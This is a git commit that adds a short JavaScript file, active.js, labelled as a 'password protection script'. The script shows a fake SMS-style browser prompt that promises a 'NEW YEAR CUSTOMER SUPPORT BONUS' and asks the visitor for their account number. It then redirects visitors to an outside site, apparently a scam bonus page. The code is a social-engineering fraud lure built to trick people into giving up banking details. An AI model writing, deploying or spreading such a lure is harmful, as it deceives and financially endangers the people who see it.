5cbebf7556c66202b8dafffcf2cdaa5441a99a6e
ita-giftt <tallaakoti@gmail.com>
2026-01-01 11:55:45 +0100

    Create active.js

---
+++ active.js
@@ -0,0 +1,10 @@
+  
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive NEW YEAR CUSTOMER SUPPORT BONUS. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+);
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://rward.info/ke-bonus-alerts.html';
+}
